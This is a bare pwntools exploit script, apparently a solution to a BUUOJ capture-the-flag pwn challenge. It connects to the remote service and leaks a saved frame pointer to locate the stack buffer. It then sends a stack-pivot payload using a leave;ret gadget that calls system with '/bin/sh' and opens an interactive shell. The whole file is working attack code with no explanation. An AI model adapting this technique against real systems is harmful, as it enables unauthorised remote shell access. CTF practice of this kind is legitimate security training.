from pwn import *

sh=remote("node5.buuoj.cn",29571)
elf=ELF("./timu")
leave_ret=0x08048562
system_plt=elf.plt["system"]
main=0x080485FF

payload=0x24*b'a'+b'bbbb'
sh.send(payload)
sh.recvuntil(b"Hello, ")
sh.recvuntil(0x24*b'a'+b'bbbb')
ebp=u32(sh.recv(4))
s_addr=ebp-0x38
payload=p32(system_plt)+p32(main)+p32(s_addr+0xc)+b"/bin/sh\x00"
payload=payload.ljust(0x28,b'a')
payload+=p32(s_addr-0x4)+p32(leave_ret)
sh.send(payload)

sh.interactive()
